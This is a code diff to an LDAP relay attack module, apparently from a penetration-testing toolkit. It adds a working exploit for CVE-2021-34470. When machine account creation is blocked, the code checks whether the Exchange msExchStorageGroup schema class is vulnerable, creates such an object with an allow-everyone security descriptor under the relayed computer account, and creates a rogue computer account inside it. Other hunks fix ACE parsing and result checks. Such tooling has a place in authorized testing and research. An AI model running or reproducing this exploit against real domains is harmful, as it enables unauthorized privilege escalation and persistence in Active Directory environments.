@@ -25,7 +25,7 @@ import re
 import dns.resolver
 import ldap3
 import ldapdomaindump
-from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
+from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM, RESULT_INSUFFICIENT_ACCESS_RIGHTS
 from ldap3.protocol.microsoft import security_descriptor_control
 from ldap3.protocol.formatters.formatters import format_sid
 from ldap3.utils.conv import escape_filter_chars
@@ -64,6 +64,7 @@ dumpedAdcs = False
 alreadyEscalated = False
 alreadyAddedComputer = False
 delegatePerformed = []
+triedMsExchStorageGroup = False
 
 #gMSA structure
 class MSDS_MANAGEDPASSWORD_BLOB(Structure):
@@ -161,7 +162,7 @@ class LDAPAttack(ProtocolAttack):
             newPassword = computerPassword
 
         computerHostname = newComputer[:-1]
-        newComputerDn = ('CN=%s,%s' % (computerHostname, parent)).encode('utf-8')
+        newComputerDn = 'CN=%s,%s' % (computerHostname, parent)
 
         # Default computer SPNs
         spns = [
@@ -179,19 +180,85 @@ class LDAPAttack(ProtocolAttack):
         }
         LOG.debug('New computer info %s', ucd)
         LOG.info('Attempting to create computer in: %s', parent)
-        res = self.client.add(newComputerDn.decode('utf-8'), ['top','person','organizationalPerson','user','computer'], ucd)
-        if not res:
-            # Adding computers requires LDAPS
-            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
-                LOG.error('Failed to add a new computer. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing account.')
-            else:
-                LOG.error('Failed to add a new computer: %s' % str(self.client.result))
-            return False
-        else:
+        res = self.client.add(newComputerDn, ['top','person','organizationalPerson','user','computer'], ucd)
+        if res:
             LOG.info('Adding new computer with username: %s and password: %s result: OK' % (newComputer, newPassword))
             alreadyAddedComputer = True
             # Return the SAM name
             return newComputer
+
+        LOG.error('Failed to add a new computer: %s' % str(self.client.result))
+
+        # If error is RESULT_INSUFFICIENT_ACCESS_RIGHTS or an exceeded Machine Account Quota, and if we're relaying a machine account,
+        # we can try exploiting the exchange schema vuln (CVE-2021-34470, credits to James Forshaw) to bypass these restrictions
+        if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM:
+            error_code = int(self.client.result['message'].split(':')[0].strip(), 16)
+            if error_code != 0x216D:
+                return False
+        elif self.client.result['result'] != RESULT_INSUFFICIENT_ACCESS_RIGHTS:
+            return False
+
+        global triedMsExchStorageGroup
+        if triedMsExchStorageGroup:
+            return False
+
+        if not self.username.endswith('$'):
+            LOG.error('Relaying a user account so we cannot exploit CVE-2021-34470 to bypass machine account creation restrictions. Try relaying a computer account')
+            return False
+
+        LOG.info('Fallback: attempting to exploit CVE-2021-34470 (vulnerable Exchange schema)')
+        LOG.info('Checking if `msExchStorageGroup` object exists within the schema and is vulnerable')
+
+        res = self.client.search(self.client.server.info.other['schemaNamingContext'][0], '(cn=ms-Exch-Storage-Group)',
+            search_scope=ldap3.LEVEL, attributes=['possSuperiors'])
+
+        if not res:
+            LOG.error('Object `msExchStorageGroup` does not exist within the schema, Exchange is probably not installed')
+            triedMsExchStorageGroup = True
+            return False
+
+        if 'computer' not in self.client.response[0]['attributes']['possSuperiors']:
+            LOG.error('Object `msExchStorageGroup` not vulnerable, was probably patched')
+            triedMsExchStorageGroup = True
+            return False
+
+        LOG.info('Object `msExchStorageGroup` exists and is vulnerable!')
+
+        result = self.getUserInfo(domainDumper, self.username)
+        if not result:
+            LOG.error("Could not find relayed computer in target DC's domain. Is this a cross-domain relay?")
+            return False
+
+        ACL_ALLOW_EVERYONE_EVERYTHING = b'\x01\x00\x04\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\n\x14\x00\x00\x00\x00\x10\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
+        relayed_dn = result[0]
+        mESG_name = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
+        mESG_dn = ('CN=%s,%s' % (mESG_name, relayed_dn))
+
+        LOG.info('Attempting to add new `msExchStorageGroup` object `%s` under `%s`' % (mESG_name, relayed_dn))
+        res = self.client.add(mESG_dn, ['top', 'container', 'msExchStorageGroup'],
+            {'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING}, controls=security_descriptor_control(sdflags=0x04))
+
+        # Only try to add an `msExchStorageGroup` object once, to not fill the domain with these in case of unexpected errors
+        triedMsExchStorageGroup = True
+
+        if not res:
+            LOG.error('Failed to add `msExchStorageGroup` object: %s' % str(self.client.result))
+            return False
+
+        LOG.info('Added `msExchStorageGroup` object at `%s`. DON\'T FORGET TO CLEANUP' % mESG_dn)
+
+        newComputerDn = 'CN=%s,%s' % (computerHostname, mESG_dn)
+        LOG.info('Attempting to create computer in `%s`', mESG_dn)
+        res = self.client.add(newComputerDn, ['top','person','organizationalPerson','user','computer'], ucd)
+
+        if not res:
+            LOG.error('Failed to add a new computer: %s' % str(self.client.result))
+            return False
+
+        LOG.info('Adding new computer with username: %s and password: %s result: OK' % (newComputer, newPassword))
+        alreadyAddedComputer = True
+        # Return the SAM name
+        return newComputer
 
     def addUser(self, parent, domainDumper):
         """
@@ -681,10 +748,12 @@ class LDAPAttack(ProtocolAttack):
 
             for ace in (a for a in sd["Dacl"]["Data"] if a["AceType"] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
                 sid = format_sid(ace["Ace"]["Sid"].getData())
-                if ace["Ace"]["ObjectTypeLen"] == 0:
+                if ace["Ace"]["Flags"] == 2:
                     uuid = bin_to_string(ace["Ace"]["InheritedObjectType"]).lower()
-                else:
+                elif ace["Ace"]["Flags"] == 1:
                     uuid = bin_to_string(ace["Ace"]["ObjectType"]).lower()
+                else:
+                    continue
 
                 if not uuid in enrollment_uuids:
                     continue
@@ -715,7 +784,7 @@ class LDAPAttack(ProtocolAttack):
                     sid_map[sid] = sid
                     continue
 
-                if not len(self.client.response):
+                if not len(self.client.entries):
                     sid_map[sid] = sid
                 else:
                     sid_map[sid] = domain_fqdn + "\\" + self.client.response[0]["attributes"]["name"]
